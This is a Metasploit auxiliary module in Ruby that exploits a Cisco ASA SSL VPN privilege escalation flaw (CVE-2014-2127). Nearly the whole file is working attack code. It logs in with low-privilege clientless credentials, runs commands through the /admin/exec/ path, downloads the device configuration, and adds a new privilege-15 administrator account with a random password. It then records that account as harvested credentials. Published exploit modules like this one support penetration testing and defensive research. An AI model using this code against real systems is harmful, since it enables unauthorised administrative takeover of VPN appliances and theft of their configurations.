##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  attr_accessor :ssh_socket

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Cisco ASA SSL VPN Privilege Escalation Vulnerability',
      'Description' => %q{
        This module exploits a privilege escalation vulnerability for Cisco 
        ASA SSL VPN (aka: WebVPN).  It allows level 0 users to escalate to 
        level 15.
      },
      'Author'       =>
        [
          'jclaudius <jclaudius[at]trustwave.com>',
          'lguay <laura.r.guay[at]gmail.com'
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2014-2127'],
          [ 'URL', 'http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140409-asa' ],
          [ 'URL', 'https://www3.trustwave.com/spiderlabs/advisories/TWSL2014-005.txt' ]
        ],
      'DisclosureDate' => "April 9, 2014",

    ))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", true]),
        OptString.new('USERNAME', [true, "A specific username to authenticate as", 'clientless']),
        OptString.new('PASSWORD', [true, "A specific password to authenticate with", 'clientless']),
        OptString.new('GROUP', [true, "A specific VPN group to use", 'clientless']),
        OptInt.new('RETRIES', [true, 'The number of exploit attempts to make', 10])
      ], self.class
    )

  end

  # Verify whether the connection is working or not
  def validate_connection
    begin
      res = send_request_cgi(
              'uri' => '/',
              'method' => 'GET'
            )

      print_good("#{peer} - Server is responsive")
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      fail_with(Failure::NoAccess, "#{peer} - Server is unresponsive")
    end
  end

  def validate_cisco_ssl_vpn   
    res = send_request_cgi(
            'uri' => '/+CSCOE+/logon.html',
            'method' => 'GET'
          )

    if res &&
       res.code == 302

      res = send_request_cgi(
              'uri' => '/+CSCOE+/logon.html',
              'method' => 'GET',
              'vars_get' => { 'fcadbadd' => "1" }
            )
    end

    if res &&
       res.code == 200 &&
       res.body.include?('webvpnlogin')

      print_good("#{peer} - Server is Cisco SSL VPN")
    else
      fail_with(Failure::NoAccess, "#{peer} - Server is not a Cisco SSL VPN")
    end
  end

  def do_logout(cookie)
    res = send_request_cgi(
            'uri' => '/+webvpn+/webvpn_logout.html',
            'method' => 'GET',
            'cookie' => cookie
          )

    if res &&
       res.code == 200
      print_good("#{peer} - Logged out")
    else
      fail_with(Failure::NoAccess, "#{peer} - Attempted to logout, but failed")
    end
  end

  def run_command(cmd, cookie)
    reformatted_cmd = cmd.split(" ").join("+")

    res = send_request_cgi(
            'uri'       => "/admin/exec/#{reformatted_cmd}",
            'method'    => 'GET',
            'cookie'    => cookie
          )

    if res
      return res
    else
      return nil
    end
  end

  def do_show_version(cookie, tries = 3)
    # Make up to three attempts because server can be a little flaky
    tries.times do |i|
      command = "show version"
      resp = run_command(command, cookie)

      if resp &&
         resp.body.include?('Cisco Adaptive Security Appliance Software Version')
        return resp.body
      else
        print_good("#{peer} - Unable to run '#{command}'")
        print_good("#{peer} - Retrying #{i} '#{command}'") unless i == 2
      end
    end

    return nil
  end

  def get_config(cookie, tries = 10)
    # Make up to three attempts because server can be a little flaky
    tries.times do |i|
      resp = send_request_cgi(
               'uri' => "/admin/config",
               'method' => 'GET',
               'cookie' => cookie
             )

      if resp &&
         resp.body.include?('ASA Version')
        print_good("#{peer} - Got Config!!!")
        return resp.body
      else
        print_good("#{peer} - Unable to grab config")
        print_good("#{peer} - Retrying #{i} to grab config (technique 1)") unless i == tries - 1
      end
    end

    return nil
  end

  def add_user(cookie, tries = 10)
    username = random_username()
    password = random_password()

    tries.times do |i|
      print_good("#{peer} - Attemping to add User: #{username}, Pass: #{password}")
      command = "username #{username} password #{password} privilege 15"
      resp = run_command(command, cookie)

      if resp &&
         !resp.body.include?('Command authorization failed') &&
         !resp.body.include?('Command failed')
        print_good("#{peer} - Privilege Escalation Appeared Successful")
        return [username, password]
      else
        print_good("#{peer} - Unable to run '#{command}'")
        print_good("#{peer} - Retrying #{i} '#{command}'") unless i == tries - 1
      end
    end

    return nil
  end

  # Generates a random password of arbitrary length
  def random_password(length = 20)
    char_array = [('a'..'z'), ('A'..'Z'), ('0'..'9')].map { |i| i.to_a }.flatten
    (0...length).map { char_array[rand(char_array.length)] }.join
  end

  # Generates a random username of arbitrary length
  def random_username(length = 8)
    char_array = [('a'..'z')].map { |i| i.to_a }.flatten
    (0...length).map { char_array[rand(char_array.length)] }.join
  end

  def do_login(user, pass, group)
    begin
      cookie = "webvpn=; " + 
               "webvpnc=; " + 
               "webvpn_portal=; " + 
               "webvpnSharePoint=; " + 
               "webvpnlogin=1; " +
               "webvpnLang=en;"

      post_params = {
        'tgroup' => '',
        'next' => '',
        'tgcookieset' => '',
        'username' => user,
        'password' => pass,
        'Login' => 'Logon'
      }

      post_params['group_list'] = group unless group.empty?

      resp = send_request_cgi(
              'uri' => '/+webvpn+/index.html',
              'method'    => 'POST',
              'ctype'     => 'application/x-www-form-urlencoded',
              'cookie'    => cookie,
              'vars_post' => post_params
            )

      if resp &&
         resp.code == 200 &&
         resp.body.include?('SSL VPN Service') &&
         resp.body.include?('webvpn_logout')

        print_good("#{peer} - Logged in with User: #{datastore['USERNAME']}, Pass: #{datastore['PASSWORD']} and Group: #{datastore['GROUP']}")
        return resp.get_cookies
      else
        fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate, check username/password/group")
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      fail_with(Failure::NoAccess, "#{peer} - HTTP Connection Failed, Aborting")
    end
  end

  def exploit
    # Validate we have a valid connection
    validate_connection()
    
    # Validate we're dealing with Cisco SSL VPN
    validate_cisco_ssl_vpn()

    # This is crude, but I've found this to be somewhat 
    # interimittent based on session, so we'll just retry
    # 'X' times.
    datastore['RETRIES'].times do |i|
      print_good("#{peer} - Exploit Attempt ##{i}")

      # Authenticate to SSL VPN and get session cookie
      cookie = do_login(
                 datastore['USERNAME'],
                 datastore['PASSWORD'],
                 datastore['GROUP']
               )

      # Grab version
      version = do_show_version(cookie, 1)

      if version_match = version.match(/Cisco Adaptive Security Appliance Software Version ([\d+\.\(\)]+)/)
        print_good("#{peer} - Show version succeeded. Version is Cisco ASA #{version_match[1]}")
      else
        do_logout(cookie)
        print_good("#{peer} - Show version failed")
        next
      end

      # Attempt to add an admin user
      creds = add_user(cookie, 1)

      do_logout(cookie)

      if creds
        print_good("#{peer} - Successfully added level 15 account #{creds.join(", ")}")

        user, pass = creds

        report_hash = {
          :host   => rhost,
          :port   => rport,
          :sname  => 'Cisco ASA SSL VPN Privilege Escalation',
          :user   => user,
          :pass   => pass,
          :active => true,
          :type => 'password'
        }

        report_auth_info(report_hash)
      else
        print_good("#{peer} - Failed to created user account")
      end
    end
  end

end
